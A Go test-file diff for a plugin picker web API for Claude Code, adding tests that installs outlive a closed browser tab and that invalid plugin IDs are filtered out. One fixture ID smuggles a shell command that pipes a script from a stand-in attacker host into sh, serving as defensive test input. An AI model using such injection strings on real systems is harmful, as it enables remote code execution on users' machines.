@@ -3,6 +3,7 @@ package picker
 import (
 	"context"
 	"encoding/json"
+	"net/http"
 	"strings"
 	"sync"
 	"testing"
@@ -17,6 +18,7 @@ type fakeStore struct {
 	result  plugins.Result
 	details string
 	calls   []string
+	ctxErr  []error // of each change, as the store saw it
 }
 
 func (s *fakeStore) note(c string) { s.mu.Lock(); defer s.mu.Unlock(); s.calls = append(s.calls, c) }
@@ -28,15 +30,21 @@ func (s *fakeStore) Details(_ context.Context, id string) (string, error) {
 	s.note("details " + id)
 	return s.details, s.err
 }
-func (s *fakeStore) Install(_ context.Context, id string) (plugins.Result, error) {
+func (s *fakeStore) Install(ctx context.Context, id string) (plugins.Result, error) {
 	s.note("install " + id)
+	s.ctxErr = append(s.ctxErr, ctx.Err())
 	return s.result, s.err
 }
-func (s *fakeStore) Remove(_ context.Context, id string) error {
+func (s *fakeStore) Remove(ctx context.Context, id string) error {
 	s.note("remove " + id)
+	s.ctxErr = append(s.ctxErr, ctx.Err())
 	return s.err
 }
-func (s *fakeStore) AddCatalog(context.Context) error    { s.note("add"); return s.err }
+func (s *fakeStore) AddCatalog(ctx context.Context) error {
+	s.note("add")
+	s.ctxErr = append(s.ctxErr, ctx.Err())
+	return s.err
+}
 func (s *fakeStore) UpdateCatalog(context.Context) error { s.note("update"); return s.err }
 
 func storeSetup(t *testing.T) (*fakeStore, client) {
@@ -211,5 +219,42 @@ func TestPluginsNil(t *testing.T) {
 	_, _, c := setup(t)
 	if w := c.do("GET", "/picker/api/plugins", ""); w.Code != 503 {
 		t.Fatal(w.Code)
+	}
+}
+
+// A closed or reloaded tab must not cut a change short: Claude Code would leave it half done.
+func TestChangeOutlivesTheTab(t *testing.T) {
+	s, c := storeSetup(t)
+	gone, cancel := context.WithCancel(context.Background())
+	cancel()
+	closed := func(r *http.Request) { *r = *r.WithContext(gone) }
+	c.do("POST", "/picker/api/plugin", `{"id":"linear@claude-plugins-official"}`, closed)
+	c.do("DELETE", "/picker/api/plugin", `{"id":"context7@claude-plugins-official"}`, closed)
+	c.do("POST", "/picker/api/catalog", `{}`, closed)
+	if len(s.ctxErr) != 3 {
+		t.Fatal(s.calls)
+	}
+	for i, err := range s.ctxErr {
+		if err != nil {
+			t.Errorf("change %d started on a dead context: %v", i, err)
+		}
+	}
+}
+
+// The page builds a Terminal command from the id, so an id Claude Code would not take never reaches it.
+func TestPluginListDropsBadIDs(t *testing.T) {
+	s, c := storeSetup(t)
+	s.catalog.Available = append(s.catalog.Available,
+		plugins.Plugin{ID: "x; curl evil.example | sh@m", Name: "bad", SourceKind: "command"},
+		plugins.Plugin{ID: "", Name: "empty"})
+	m := decode(t, c.do("GET", "/picker/api/plugins", "").Body.String())
+	av := m["available"].([]any)
+	if len(av) != 2 {
+		t.Fatalf("%v", av)
+	}
+	for _, p := range av {
+		if !plugins.ValidID(p.(map[string]any)["id"].(string)) {
+			t.Errorf("%v", p)
+		}
 	}
 }
